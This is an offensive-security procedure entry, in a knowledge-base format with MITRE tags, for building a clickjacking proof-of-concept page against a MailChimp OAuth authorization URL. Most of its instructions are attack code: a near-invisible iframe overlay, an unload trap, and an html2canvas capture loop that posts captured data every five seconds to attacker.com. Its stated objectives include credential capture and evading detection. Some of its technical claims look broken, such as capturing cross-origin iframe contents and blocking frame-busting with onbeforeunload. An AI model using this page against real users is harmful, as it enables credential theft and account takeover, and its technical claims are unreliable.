---
tags:
  - clickjacking
  - javascript
  - phishing
type: procedure
tools:
  - '[[tools/html2canvas]]'
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: a822ada7-db1b-4eb3-b1b7-f14ca5b0451e
created_at: '2025-12-14T17:28:05.384Z'
updated_at: '2025-12-14T17:28:05.384Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Malicious-HTML-Page-for-Clickjacking-PoC

## Summary

This procedure creates a proof-of-concept HTML page that uses an invisible iframe to overlay MailChimp's OAuth form, capturing user credentials via JavaScript for exfiltration in a clickjacking attack.

## Description

The attack leverages the vulnerable OAuth page by embedding it in a large, transparent iframe on a phishing site. JavaScript prevents frame-busting and uses libraries like html2canvas to screenshot or log form interactions, tricking users into entering credentials that are then sent to the attacker, potentially granting full MailChimp account control.

## Requirements

1. Text editor for HTML/JS creation
2. Access to html2canvas library (via CDN or local)
3. Knowledge of iframe positioning and CSS for invisibility

## Defense

Defensive measures and detection strategies:

- Enforce frame-busting scripts or headers on auth pages
- Detect anomalous JavaScript executions or canvas captures in browser security tools
- Educate users on phishing link verification

## Objectives

1. Construct an undetectable overlay for the auth form
2. Implement credential capture and anti-detection mechanisms
3. Prepare the PoC for hosting and testing

## Instructions

### Step 1: Set Up Basic HTML Structure

**Context**: Create the base page with an overlaying iframe sourcing the vulnerable OAuth URL.

Write an HTML file with a full-screen iframe:

```html
<!DOCTYPE html>
<html>
<head><title>Stripo Export Helper</title></head>
<body>
<iframe src="https://login.mailchimp.com/oauth2/authorize?response_type=code&client_id=350877244304&redirect_uri=https%3A%2F%2Fmy.stripo.email%2Fcabinet%2Fexportservice%2Fv1%2Fmailchimpauth.html%3FaccountId%3D2085372" width="1200" height="2500" style="opacity:0.1; position:absolute; top:0; left:0;"></iframe>
</body>
</html>
```

> This embeds the auth page invisibly or semi-transparently to overlay a fake form if needed.

### Step 2: Add JavaScript for Capture and Anti-Busting

**Context**: Integrate html2canvas to capture form contents and prevent the iframe from busting out.

Include the library and scripts:

```html
<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
<script>
window.onbeforeunload = function() { return "Stay on page"; };
setInterval(function() {
  html2canvas(document.querySelector('#capture')).then(canvas => {
    // Exfiltrate canvas.toDataURL() to attacker server
    fetch('https://attacker.com/log', {method: 'POST', body: canvas.toDataURL()});
  });
}, 5000);
</script>
<div id="capture">Overlay form here</div>
```

> This captures the iframe contents periodically and sends them, while blocking unload events to keep the user engaged.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/html2canvas]]

## Tags

- [[clickjacking]]
- [[JavaScript]]
- [[Phishing]]
